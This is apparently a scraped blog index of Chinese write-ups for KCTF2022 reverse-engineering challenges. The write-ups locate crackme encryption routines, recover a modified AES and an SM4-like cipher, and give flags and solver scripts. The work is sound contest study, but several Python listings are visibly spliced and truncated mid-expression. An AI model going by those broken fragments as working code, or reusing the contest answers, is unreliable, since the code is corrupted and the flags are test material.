继续往上分析，找到导致跳转的源头，结合OD进行分析，可以得到，这里对栈中的值进行了比较，若两处的值完全相同，则会进入理想的分支中。否则会跳转到”失败1”对应的分支 通过交叉引用，可以发现，其中进行比较的一个值是写死的，可以直接找到（所以另一个值就是将输入的字符串进行变换得到的了），这里可以先将其记录下 这里可以看到，随机输入的字符串，得到的新字符串（暂且称作其为加密字符串），和需要进行比较的结果差距还是很大的。接下来要做的，就是找出字符串是如何经过变换得到加密字符串的 定位字符串的加密逻辑 我们可以看到在当前函数中是没有其它位置修改了这个值，并且在上一张图中可以看到，在实际情况中，加密字符串位于[ebp+0x1B0]开始的地址处（ecx的值初始为0，每轮加1，用于遍历字符串）。所以接下来，我们就向上回溯，寻找会向地址[ebp+0x1B0]处写入值的函数 这里为什么要找[ebp+0x1B0]？上层调用函数栈不是会下降吗？ebp变了，为啥寻址没变？其实我也不知道为啥要这样做，我只是找规律，我通过交叉引用找到调用sub_46D092的上层函数时，发现在该函数[ebp+0x1B0]的位置，也已经存储了加密后的字符串（这意味着还需要往上层找），尽管sub_46D092中的ebp和上层函数中的ebp值不一样，但是加密字符串都是存在[ebp+0x1B0]处，所以按照规律就这么找了，这里对这个地址下硬件访问断点也可以 然后我们在sub_4631E9中找到了，arg_1A8对应的刚好是0x1B0。这是sub_46D092上层函数的上层函数 接下来，通过交叉引用，可以找到一个函数sub_49AF99，它将[ebp+0x1B0]这个地址作为参数传了进去 单步调试一下，也可以发现，执行sub_49AF99前，会传入一个空缓冲区，执行后就填充了加密后的字符串，这下可以断定，这里的sub_49AF99就是对字符串进行加密的地方。接下来就可以针对sub_49AF99这个函数进行分析 分析字符串加密逻辑并解密 这部分主要就是逆向基本功，结合IDA和OD进行分析，然后还原加密的算法。因此这里仅作一些简单的描述。前面讨论的如何定位到这个算法的位置才是关键 首先sub_49AF99有5个参数，a1是用于给字符串加密的密钥（我一开始分析时，没意识到这个是密钥），Source是经过一次变换后得到的字符串，Size是经过变换后字符串的大小，a4存放经过加密后的字符串 这里的unkown_libname_3其实就是malloc，IDA没解析出来，然后依次调用malloc、memset、strcpy，将已经经过一次变换后的字符串，复制到一块新初始化的大小为0x20字节的堆空间中。这里需要补充一点，在单步调试时会发现，此处已经经过变换的字符串其实只有0x10字节，并且strcpy在复制字符串时遇到0x00就会截断。因此也只复制了0x10字节到这个大小为0x20字节的堆块中。那为什么要申请0x20字节的空间呢？咱接着分析 sub_49D068实际上就是memset，初始化一块栈空间，然后调用sub_49D38F，通过密钥a1，生成一个box，实际上就是进行了密钥扩展。我测试了不同的输入字符串，然后在此处下断，发现每次生成的box值是不变的，因此在分析时就直接拿来用了 接下来调用sub_49D025进行加密，这里有4个参数，v10为刚刚初始化的box，v5是存放字符串的堆块的大小（这里是0x20，前0x10存着经过变换的字符串，后0x10字节是0），v9是堆块首地址，指向字符串第一个字符，a4用于存放加密后的字符串 进入sub_49D025，这有一个循环，v7计算出的值为2（因为length的值为0x20），所以会循环两次，分别去调用sub_49D07F去计算加密字符串的结果，一次加密16个字节。所以sub_49D025实现的是多块加密，sub_D07F实现的是单个块加密。这里也可以看出来，输入的字符串经过变换后只剩下0x10字节，但加密时仍然会分块加密，一共加密0x20个字节，并且第二次加密的0x10字节所使用的字符串全为0 进入sub_49D07F，就是加密算法了，这部分可以先将功能逆出来，然后再写出解密算法，还原的代码如下： python123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133# 加密算法s1 = 'A1234567123456781234567812345678's2 = '00000000000000000000000000000000'byte_7EC3E8 = [0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7,0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05, 0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3,0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99, 0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A,0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62, 0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95,0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6, 0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA,0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8, 0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B,0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35, 0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2,0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0x78, 0x87, 0xD4, 0x00, 0x46, 0x57, 0x9F, 0xD3, 0x27, 0x52,0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E, 0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5,0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1, 0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55,0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3, 0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60,0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F, 0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F,0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51, 0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F,0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8, 0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD,0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0, 0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E,0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84, 0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20,0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48]box = [0x8C925023,0x4BBE4C99,0x1BF3D26F,0x1E193BDF,0x37B81FD9,0xF82AEB6B,0x0EB8EA2C,0x01F7CCC7,0xC3495601,0x23FE4548,0x4A3FC333,0xCFDF05E8,0x141FB615,0x9EF7B415,0x466E0E37,0x8BE01DE9,0xD7566D09,0xBD20455F,0xCCC85ED0,0xC5303952,0xC847CE90,0x4ADFA7C6,0x46803565,0x1873D9A8,0xE9AD4459,0x307C97E3,0x3ECF9AD7,0x1C72E515,0x8F1B291C,0xFEAB7BE6,0x677FBEB8,0xF1EC5D67]def sub_7CD07F(box, s): res = [] v15 = [] for i in range(36): v15.append(0) v4 = int(s[5]) v15[0] = int(s[3]) | ((int(s[2]) | ((int(s[1]) | (int(s[0]) <","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://cata1oc.github.io/tags/CTF/"},{"name":"Windows逆向","slug":"Windows逆向","permalink":"http://cata1oc.github.io/tags/Windows%E9%80%86%E5%90%91/"}]},{"title":"KCTF2022春季赛第七题","slug":"KCTF2022春季赛第七题","date":"2022-05-24T13:19:12.000Z","updated":"2022-05-24T13:31:32.304Z","comments":true,"path":"2022/05/24/KCTF2022春季赛第七题/","link":"","permalink":"http://cata1oc.github.io/2022/05/24/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B%E7%AC%AC%E4%B8%83%E9%A2%98/","excerpt":"","text":"前言一道简单题，签到题难度，但是排在了第七题的位置，简简单单的一道Go逆向，思路还是比较新，作者重写了标准库的函数，做了个简单的校验，但是静态就可以看出来逻辑，甚至通过校验部分可以直接猜到出题思路，以至于最终没有分析完就得到了答案。至于没有分析完的，也懒得分析了，就是个需要花费至多十多分钟去分析的一个赋值操作，wp在看雪发了一份，很开心混了10rank值，博客上也备份一篇（改都没改） 今天晚些时候，key告诉我说我的分析文章上了看雪公众号了！！！是真的！而且key第四题的wp也上了公众号，哈哈哈哈哈，太秀了简直是，真的是没想到，可能是大佬觉得这题太简单了，所以就不想写太细，于是我们这些新手就有了机会，太感动了，我爱死看雪了！给了我极大的信心！哈哈哈哈，我好开心啊！真想把第八题也做出来！ Step1运行程序，随便进行一些输入，根据反馈可以得出： 如果输入的不是数字或者长度不为7，则会出现错误的反馈 如果输入长度为7的数字，若不为正确结果，则不会回显 Step2将程序拖入IDA，发现是Go写的。所以先用Go的反编译插件解析一遍。然后进入main_main查看主要逻辑： 最早弹出的提示”请输入7位数字”，不在循环内，因此只会在第一次打开程序时提示一次 蓝色方框位于大循环中的第一个小循环里，通过读取输入的字符串，并判断字符串的长度是否为7，否则就会在循环里提示”请输入长度7”。 橙色方框在一个for循环中对字符串进行校验，若存在数字之外的字符，则会提示”请输入数字” 若字符串均为数字，则会在for循环执行结束后，从LABEL_11进入粉色方框 Step3在前一步中，存在一个问题，按照正确逻辑，当程序进入粉色方框后，fmt_Println_0应该打印出”fail!!!”的提示，但实际并没有任何回显，接下来就看一看这个fmt_Println_0 通过与标准库中的fmt_Println比较，可以发现fmt_Println_0多了一大段的校验判断过程 在x64dbg中找到最后一个if的位置，将这里的jne给patch掉，再运行一遍看看情况如何 可以看到提示了”success”，也就意味着，输入的flag需要能够过掉上方的校验即可 Step4 通过交叉引用，可以找到给变量赋值的地方，发现位于fmt_Print中，也就是打印提示”->”的地方。由于这些变量的地址是连续的，所以可以直接转换为数组来看（默认名为fmt_Abc） 此时再来看校验的地方就清晰很多，可以将其转换为一个4X4的矩阵，然后就可以得到如下的逻辑：这里需要保证，矩阵每行每列，以及框出的4个四宫格的元素之和，必须为10。这里刚好有7个0，而要求输入的字符串刚好是7位数字，所以这里猜测是用输入的7位数字，填充这7个0的位置，从而满足校验 这里通过交叉引用看一下这些原先值为0的位置被哪些地方修改过，最终会发现，在bufio__ptr_Reader_ReadString中有一段用输入字符串给fmt_Abc数组元素赋值的操作，也就验证了之前的猜想。最终，根据4X4矩阵填充的值，可以得到flag字符串为”4224131”","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://cata1oc.github.io/tags/CTF/"},{"name":"Windows逆向","slug":"Windows逆向","permalink":"http://cata1oc.github.io/tags/Windows%E9%80%86%E5%90%91/"},{"name":"Go","slug":"Go","permalink":"http://cata1oc.github.io/tags/Go/"}]},{"title":"KCTF2022春季赛第三题","slug":"KCTF2022春季赛第三题","date":"2022-05-14T22:04:23.000Z","updated":"2022-05-19T16:08:14.110Z","comments":true,"path":"2022/05/15/KCTF2022春季赛第三题/","link":"","permalink":"http://cata1oc.github.io/2022/05/15/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B%E7%AC%AC%E4%B8%89%E9%A2%98/","excerpt":"","text":"前言这是一次失败的经历，从周五放出题开始，不到2个小时，就有人解出题目，上午刚刚写完wp的喜悦瞬间消散，开始着手准备解题。这一天没有进展。直至第二天傍晚，才开始有所眉目。所谓的异常处理，并不会对解题有太大影响，相反，题目算法本身的复杂度，成了影响的关键因素，从周六傍晚开始逆算法，直至第二天凌晨4点30，终于逆出了完整的算法，此时我已精疲力竭。然而，仅有算法还不足以解题，需要逆算法才可以，此时精力已经不足，在进行一些简单的尝试后，遂放弃了此题。 中午过后，公开了各个大佬的wp，发现自己原来把魔改后的AES逆了一遍，显得有些愚蠢、呆板，但是看着大佬们的解题思路，豁然开朗，这是一次绝佳的学习机会，所以，趁着现在对该题还有印象，又不想浪费自己的分析，这里会结合各个大佬的wp，简单分析一下程序的坑点和流程。并在最后，依次分析大佬们的解题思路和思维方式。 分析流程异常处理 问题描述：该题的第一个坎是异常处理，如图中所示，红色方框会向0地址写入数据，从而触发异常。本题中引发异常的位置还有若干个，触发异常后，再在异常处理函数中修正EIP的值。 解决方案： 理解异常发生后的程序控制流，patch程序让程序的控制流恢复正常，这里可以参考以下两篇“看雪CTF签到题SEH异常处理”与“SEH的非常好的总结”关于SEH机制的文章 较为密集的下断点，从而推测出程序的执行流程。例如这里，可在图中橙色方框伪代码对应的汇编处下断点 Findcrypt题目使用了魔改的MD5和AES，由于对AES的生疏，做题期间，我自始至终都没有察觉其存在。根据部分大佬的wp，通过IDA的插件Findcrypt可以快速定位加密算法的存在。这里附上安装说明和官网链接。此外还需要yara环境支持。安装后可以在Edit -> Plugins -> Findcrypt进行使用。 如上图所示，经过简单分析，可以将原先的函数备注为MD5_Encrypt与AES_Encrypt，尽管这俩都经过了魔改 MD5_Encrypt第一个需要看的是MD5_Encrypt，图中x32dbg中显示的duplicity.7B1109，就是伪代码中被我们标记为MD5_Encrypt的函数 参数分析 v8[9]：指向字符串”Enj0y_1t_4_fuuuN” 0x10：长度单位 v8[2]： 执行前指向一块初始化为0的栈空间 执行后该栈空间更新为16字节的MD5密文 AES_Encrypt这是一个经过魔改的AES_Encrypt加密，先分析参数： 参数分析 v8[2]：经过MD5加密后的密文 0x10：经过MD5加密后的密文长度 v8[30]：输入的字符串，从橙色方框中的gets_s获取 v8[18]：经过AES加密后的输出字符串，之后通过memcmp将其与结果进行了一次比较 32：输入字符串的长度，橙色方框中通过strlen进行了一次过滤 AES算法 以上为AES算法的流程图，这里不对该算法做详细介绍，但理解AES算法还是非常重要的，这里分享如下链接，简略版可参考1，详细版可以参考2，综合版可以参考3，C语言版可以参考4。在对AES了解的情况下，可以找到相似项目，手动导入结构体及符号，以助于伪代码的分析。 KeyExpansion 分析 首先是keyExpansion的代码，这部分会对MD5计算出的key进行扩展，跟进去发现，又是一个会触发的异常，这里需要patch try部分，patch后核心代码可见，这里可以参考sunfishi的分析文章，他patch了此部分，并导入了符号与结构体，看着会更清晰。 这里还有很重要的一点，在keyExpansion进行扩展密钥时，进行了sbox中数据的交换，从而使得真正使用的S_box与原版AES的S_box有所不同，这里是题目魔改AES的一处地方，会影响后续做题。 反思 当时做题时，这部分我并没有分析，当时并未意识到这是AES的算法，keyExpansion函数执行后，栈中会生成一部分数据，在之后的计算中会用到，在试过不同的输入后，发现这段栈中的数据是固定不变的，于是就拿来直接用了…… 关于sbox魔改这块，我后来也发现了，不过是在最后，在已经逆完所有算法的情况下，发现计算出的结果不对。经过一个个函数的单步调试，终于发现了sbox值交换的这个操作，这里感谢我可爱的女朋友凌晨陪我调试代码！ 图中duplicity.7B10BE即伪代码中标识出的keyExpansion在执行完后，栈中就会有生成扩展密钥，具体如下： python1234567891011v10 = [0x2F65B1FF, 0x31ED86D0, 0x9A285C0F, 0x4048059D, 0x7C0EEFF6, 0x4DE36926, 0xD7CB3529, 0x978330B4, 0x920A627E, 0xDFE90B58, 0x08223E71, 0x9FA10EC5, 0xA4A1C4A5, 0x7B48CFFD, 0x736AF18C, 0xECCBFF49, 0xB3B7FF6B, 0xC8FF3096, 0xBB95C11A, 0x575E3E53, 0xFB051230, 0x33FA22A6, 0x886FE3BC, 0xDF31DDEF, 0x1CC4CDAE, 0x2F3EEF08, 0xA7510CB4, 0x7860D15B, 0x8CFAF412, 0xA3C41B1A, 0x049517AE, 0x7CF5C6F5, 0xEA4E1202, 0x498A0918, 0x4D1F1EB6, 0x31EAD843, 0x762F08C5, 0x3FA501DD, 0x72BA1F6B, 0x4350C728, 0x13E93CDF, 0x2C4C3D02, 0x5EF62269, 0x1DA6E541] Load/StoreStateArray 分析 从for循环可以看出，输入的32字节的字符串，会被分为2份进行操作，每次操作16字节，图中保存在变量v8中 这16字节，会按照字节顺序，从左到右从上到下每行4个的方式进行排列，形成一个4x4的矩阵 loadStateArray会将矩阵斜对角线两侧的数据进行一个交换 storeStateArray会再按照矩阵斜对角线将两侧的数据交换回来 还原 python123456789101112131415161718# 注意这里只是还原算法，并不是解算法，后面同理def loadStateArray(buf, orig): for i in range(4): for j in range(4): buf[4 * j + i] = ord(orig[4 * i + j]) return bufdef storeStateArray(buf): res = [] for i in range(16): res.append(0) for i in range(4): for j in range(4): res[i * 4 + j] = buf[4 * j + i] return res 解法 该算法是自旋的，只需再调用一遍即可解锁 AddRoundKey 分析 这里的参数v10，实际上就是经过keyExpansion扩展后的密钥，在函数开头，v10与v12指向了同一地址 在addRoundKey中，会将输入的数据与密钥按照字节异或，结果覆盖原先字符串字节处的值 在每轮异或运算过后，参数会指向扩展密钥的后16个字节的开始位置，这部分可以参考AES加密的密钥加法层 还原 python12345678910111213def addRoundKey(buf, local): res = [] for i in range(16): v5.append(0) for i in range(16): res.append(0) for i in range(4): for j in range(4): v5 = (local[j] >> (8 * (3 - i))) & 0xFF res[4 * i + j] = (buf[4 * i + j]) ^ v5 return res 解法 异或运算是对称的，因此可以再异或回去 SubBytes 分析 subBytes对应AES的字节代换层，字节代换层的主要功能就是让输入的数据通过S_box表完成从一个字节到另一个字节的映射，这g个S_box表是通过某种方法计算出来的 本题中，在本地偏移0x40B000处，有一个默认的S_box；但是在真正进行运算时S_box中的值被替换了（在keyExpansion中被替换了，然而这部分代码通过异常处理隐藏了，需要手动patch） c1234567891011121314151617181920212223242526272829303132333435// 原版S_box0040B000 63 7C 77 7B F2 6B 6F C5 30 01 67 2B FE D7 AB 76 0040B010 CA 82 C9 7D FA 59 47 F0 AD D4 A2 AF 9C A4 72 C0 0040B020 B7 FD 93 26 36 3F F7 CC 34 A5 E5 F1 71 D8 31 15 0040B030 04 C7 23 C3 18 96 05 9A 07 12 80 E2 EB 27 B2 75 0040B040 09 83 2C 1A 1B 6E 5A A0 52 3B D6 B3 29 E3 2F 84 0040B050 53 D1 00 ED 20 FC B1 5B 6A CB BE 39 4A 4C 58 CF 0040B060 D0 EF AA FB 43 4D 33 85 45 F9 02 7F 50 3C 9F A8 0040B070 51 A3 40 8F 92 9D 38 F5 BC B6 DA 21 10 FF F3 D2 0040B080 CD 0C 13 EC 5F 97 44 17 C4 A7 7E 3D 64 5D 19 73 0040B090 60 81 4F DC 22 2A 90 88 46 EE B8 14 DE 5E 0B DB 0040B0A0 E0 32 3A 0A 49 06 24 5C C2 D3 AC 62 91 95 E4 79 0040B0B0 E7 C8 37 6D 8D D5 4E A9 6C 56 F4 EA 65 7A AE 08 0040B0C0 BA 78 25 2E 1C A6 B4 C6 E8 DD 74 1F 4B BD 8B 8A 0040B0D0 70 3E B5 66 48 03 F6 0E 61 35 57 B9 86 C1 1D 9E 0040B0E0 E1 F8 98 11 69 D9 8E 94 9B 1E 87 E9 CE 55 28 DF 0040B0F0 8C A1 89 0D BF E6 42 68 41 99 2D 0F B0 54 BB 16 // 实际使用的S_box 0040B000 63 7C 77 7B F2 6B 6F C5 30 01 67 2B FE D7 AB 76 0040B010 CA 82 C9 7D FA 59 47 F0 AD D4 A2 AF 9C A4 72 C0 0040B020 B7 FD 93 26 36 3F F7 CC 34 A5 E5 F1 71 D8 31 15 0040B030 04 C7 23 C3 18 96 05 9A 07 12 80 E2 EB 27 B2 75 0040B040 09 83 2C 1A 1B 6E 5A A0 52 3B D6 B3 29 E3 2F 84 0040B050 53 D1 00 ED 20 FC B1 5B 6A CB BE 39 4A 4C 58 CF 0040B060 D0 EF AA FB 43 4D 33 85 45 F9 02 7F 50 3C 9F A8 0040B070 51 0A 40 8F 92 9D 38 F5 BC B6 DA 21 10 FF F3 D2 0040B080 CD 0C 13 EC 5F 97 44 17 C4 A7 7E 3D 64 5D 19 73 0040B090 60 81 4F DC 22 2A 90 88 46 EE B8 14 DE 5E 0B DB 0040B0A0 E0 32 3A A3 49 06 24 5C C2 D3 AC 62 91 95 E4 79 0040B0B0 E7 C8 37 6D 8D D5 4E A9 6C 56 F4 EA 65 7A AE 08 0040B0C0 BA 78 25 2E 1C A6 B4 C6 E8 DD 74 1F 4B BD 8B 8A 0040B0D0 70 3E B5 66 48 03 F6 0E 61 35 57 B9 86 C1 1D 9E 0040B0E0 E1 F8 98 11 69 D9 8E 94 9B 1E 87 E9 CE 55 28 DF 0040B0F0 8C A1 89 0D BF E6 42 68 41 99 2D 0F B0 54 BB 16 两个S_box不同之处在于地址0x0040B071（”0xA3”）与0x0040B0A3处的值（”0x0A”）交换了 由于交换是在keyExpansion中进行的，所以执行到此处时S_box已确定，可以直接从内存中dump出来用 还原 python12345678910def subBytes(buf): res = [] for i in range(16): res.append(0) for i in range(4): for j in range(4): res[4 * i + j] = byte_40B000[buf[4 * i + j]] return res 解法 拥有密钥（MD5生成的16字节密钥）的情况下解AES，通常需要逆S_box盒，这里S_box修改了，逆S_box盒也要相应修改 直接在S_box找到对应的值的下标（0 (8 * (3 - i))) & 0xFF res[4 * i + j] = (buf[4 * i + j]) ^ v5 #print(4 * i + j, hex(local[j]), hex(local[j] >> (8 * (3 - i))), hex(v5), hex(res[4 * i + j])) return res def sub_401172(buf): res = [] #print() #print('s', 'orig', 'now') for i in range(16): res.append(0) for i in range(4): for j in range(4): res[4 * i + j] = byte_40B000[buf[4 * i + j]] #print(4 * i + j, hex(buf[4 * i + j]), hex(res[4 * i + j])) return res # RORdef sub_40122B(buf): res = [] for i in range(16): res.append(0) for i in range(4): res[4*i:5*i] = buf[4*i+4-i:4*i+4] res[5*i:4*i+4] = buf[4*i:4*i+4-i] #print() #print('after ror:') #for i in range(4): # print(hex(res[4 * i]), hex(res[4 * i + 1]), hex(res[4 * i + 2]), hex(res[4 * i + 3])) return resdef sub_40100F(buf): v9 = [] res = [] for i in range(16): res.append(0) for i in range(44): v9.append(0xCC) v9[0] = 2; v9[1] = 3; v9[2] = 1; v9[3] = 1; v9[4] = 1; v9[5] = 2; v9[6] = 3; v9[7] = 1; v9[8] = 1; v9[9] = 1; v9[10] = 2; v9[11] = 3; v9[12] = 3; v9[13] = 1; v9[14] = 1; v9[15] = 2; for i in range(4): for j in range(4): v9[4 * i + 24 + j] = buf[4 * i + j] #for x in v9: # print(hex(x)) #print() for k in range(4): for m in range(4): tmp = sub_401118(v9[4 * k], v9[m + 24]) v1 = tmp tmp = sub_401118(v9[4 * k + 1], v9[m + 28]) v2 = tmp ^ v1 tmp = sub_401118(v9[4 * k + 2], v9[m + 32]) v3 = tmp ^ v2 tmp = sub_401118(v9[4 * k + 3], v9[m + 36]) v4 = tmp ^ v3 res[4 * k + m] = v4 return resdef sub_401118(a1, a2): v5 = 0 for i in range(8): if a1 & 1 != 0: v5 = (a2 ^ v5) & 0xFF v3 = a2 & 0x80 a2 = (a2 * 2) & 0xFF if v3 != 0: a2 = (a2 ^ 0x1B) & 0xFF a1 = (a1 >> 1) & 0xFF return v5 if __name__ == '__main__': s1 = '0123456789abcdefghijklmnopqrstuv' s2 = 'xyzdefghijklmnopqrstuv0123456789' sub_402070(s2[0:16]) #sub_402070(s2[16:32]) 大佬思路 dead.ash 这位大佬的分析思路比较值得参考 首先单步一遍，理清大概的思路，把大部分的坑都踩一踩 梳理单步的逻辑，猜测校验流程 多次输入测试字符串，观察反馈结果 F5开始分析程序 依次分析算法，并分析出对应的逆算法 ThTsOd 多处下断，梳理主要逻辑 找到关注点如长度判断与最后用于比较的memcmp IDA中使用Findcrypt进行算法侦测 分析与原本算法不同之处，即魔改的地方 针对魔改处，修改原本算法的解密算法 mb_mgodlfyn F5，梳理main函数逻辑 分析导致异常的暗装，进行对应的绕过（mb_mgodlfyn对绕过说明的更细）和patch（这部分sunfishi贴出了patch后的代码，几处关键的patch都贴出了） 与标准的AES做对比进行分析 参考标准的AES解密算法进行修改并解密 还有部分大佬的就不贴出来了，整体的分析逻辑大差不差，其中wx_孤城的做题技巧值得学习，他通过自旋的方式，成功解密了比较复杂的加密步骤；而sunfishi则细心的patch了隐藏在异常处理中的核心逻辑，并且根据开源的AES项目导入了符号和结构体，看的也更加清晰；以上都是值得学习的思路和技巧。 参考链接 看雪：Findcrypt安装说明 Github：Findcrypt官网 简书：看雪CTF签到题SEH异常处理 CSDN：SEH的非常好的总结 看雪：trackL分析文章 看雪：mb_mgodlfyn分析文章 Github：lmshao AES 看雪：AES加密算法 看雪：密码学基础：AES加密算法 CSDN：AES加密算法的详细介绍与实现 CDSN：AES算法描述及C语言实现 看雪：sunfishi分析文章 看雪：wx_孤城 看雪：IDA为什么产生 sp-analysis failed 看雪：IDA sp-analysis failed 不能F5的 解决方案之(一) 看雪：IDA sp-analysis failed 不能F5的 解决方案之(二) 看雪：用DUMP的方式解决IDA F5失败 看雪：堂前燕分析文章","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://cata1oc.github.io/tags/CTF/"},{"name":"Windows逆向","slug":"Windows逆向","permalink":"http://cata1oc.github.io/tags/Windows%E9%80%86%E5%90%91/"}]},{"title":"KCTF2022春季赛第二题","slug":"KCTF2022春季赛第二题","date":"2022-05-13T03:24:16.000Z","updated":"2022-05-19T16:07:48.955Z","comments":true,"path":"2022/05/13/KCTF2022春季赛第二题/","link":"","permalink":"http://cata1oc.github.io/2022/05/13/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B%E7%AC%AC%E4%BA%8C%E9%A2%98/","excerpt":"","text":"前言2022春季赛的第二题，成功在规定时间内完成，写完wp后首发在看雪论坛，还混到了一个优秀，现在补档到博客里。 分析流程Part 0x0 sub_40100C用来显示文本内容 sub_40103A用来读取输入字符串 IDA分析出的 v9 >= 0，这里的v9是单字节有符号数，因此实际运算时表现为 v9 > 8) | 0xFF000000) ^ tmp else: v11 = (v11 >> 8) ^ tmp v67 = v11 ^ 0xFFFFFFFF print('Part 0x2, This Value Should Be 0xF52E0765: ', hex(v67)) if v67 == 0xf52e0765: return 1 # Part 0x3 s = sub_4010B7(s, v4) print('Part 0x3 Manipulat Original String, Used For Xor: ', s) # Part 0x4 v13 = v72 v69 = 1 v14 = v72 + 1 v66 = [] while(v13 < v14): if v13 > 0x80: v15 = 0xFFFFFF00 | v13 for j in range(200): if (v15 & 1) != 0: v15_abs = 0xFFFFFFFF - v15 + 1 v15_abs = 3 * v15_abs - 1 v15 = 0xFFFFFFFF - (v15_abs - 1) else: if v15 > 0x80000000: v15 = (v15 >> 1) | 0x80000000 else: v15 = v15 >> 1 v66.append(hex(v15)) #print(j, ' ', hex(v15)) else: v15 = v13 & 0xFF for j in range(200): if (v15 & 1) != 0: v15 = 3 * v15 + 1 else: if v15 > 0x80000000: v15 = (v15 >> 1) | 0x80000000 else: v15 = v15 >> 1 v66.append((v15)) #print(j, ' ', hex(v15)) v13 = v13 + 1 # Part 0x5 if v72 < 0x80: print('Part 0x5, Calculate With Or: ', (v66[195]), (v66[196]), (v66[197])) v17 = (v66[195]) | (v66[196]) | (v66[197]) v18 = v71 cmp_a = (s[0])^(s[1])^(s[2]) print('Part 0x5, Or Result: ', hex(v17)) print('Part 0x5, Xor Result: ', hex(cmp_a)) else: print('Part 0x5, Calculate With Or: ', hex(int(v66[195], 16)), hex(int(v66[196], 16)), hex(int(v66[197], 16))) v17 = int(v66[195], 16) | int(v66[196], 16) | int(v66[197], 16) v18 = v71 cmp_a = (s[0])^(s[1])^(s[2]) print('Part 0x5, Or Result: ', hex(v17)) print('Part 0x5, Xor Result: ', hex(cmp_a)) # Part 0x6 v19 = v17 + 2 v20 = v18 - v19 - 7 print('Part 0x6, This Value Should Be Less Than Or Equal 0: ' , v20) # Part 0x7 ['007KCTF' can pass here] print('Part 0x7, s[3] should be 0x14/20: ', s[3]) print('Part 0x7, s[4] should be 0xC/12: ', s[4]) print('Part 0x7, s[5] should be 0x1D/29: ', s[5]) print('Part 0x7, s[5] should be 0xF/15: ', s[6]) # Part 0x8 # v69 = 1, define in Part 0x4 # v74[0] == s[6] # v74[1] ~ v74[ # v19, Rest Length Of String # v70 = 0, define in Part 0x0 v74 = s[6:] print('Part 0x8, Rest Length Of String: ', v19) v21 = 0 v71 = 0 if v19 > 0: v22 = 1 for i in range(v19): v23 = v74[v22] + 10 * v70 print('Part 0x8, (' ,v23, '=', v74[v22], '+', '10 *', v70, ')%', v69, '==', v23%v69) v24 = v23 - 0x37373737 if v23 0: v26 = v19 - 1 for i in range(v26): v27 = 0 if v25 > 0: for i in range(v25): v28 = v74[v27 + 1] v29 = v74[v27 + 2] if v28 > v29: v74[v27 + 1] = v29 v74[v27 + 2] = v28 v27 = v27 + 1 v25 = v25 - 1 print('Part 0x9, Last 9 Elements After Sort: ', v74[1:]) # Part 0xA a_str = '1234567890_ABCDEFGHIJKLMNOPQRSTUVWXYZ' a_str = sub_4010B7(a_str, v19) print('Part 0xA, a_str: ', a_str) v30 = 0 if v19 > 0: for i in range(v19): print('Part 0xA, Compare 2: ', a_str[v30], v74[v30+1]) if a_str[v30] != v74[v30+1]: print('Failed!') return 0 v30 = v30 + 1 return 0 def sub_4010B7(s, length): res = [] for i in range(length): v4 = ord(s[i]) v5 = 48 if v4 >= 58: v5 = 55 res.append((v4 - v5) & 0xFF) #res.append(chr((v4 - v5) & 0xFF)) #print(''.join(res)) return res def sub_40106C(): v1 = [] for i in range(1024): v2 = i v3 = 8 for j in range(8): if (v2 & 1) != 0: tmp = 0xEDB88320 else: tmp = 0 if v2 >= 0x80000000: v2 = ((v2 >> 1) | 0x80000000) ^ tmp else: v2 = (v2 >> 1) ^ tmp #print(hex(v2)) v1.append(v2) v1.append(1) return v1 if __name__ == '__main__': s = 'A7AKCTF381654729' res = func(s) ''' # Fuzz One For Last 9 Bytes prefix = 'A7AKCTF' maybe_result = [] example = '123456789' result = itertools.permutations(example) for x in result: suffix = ''.join(x) s = prefix + suffix #print(s) res = func(s) if res == 1: print(res, s) break print(maybe_result) ''' ''' # Fuzz Two For First 3 Bytes suffix = 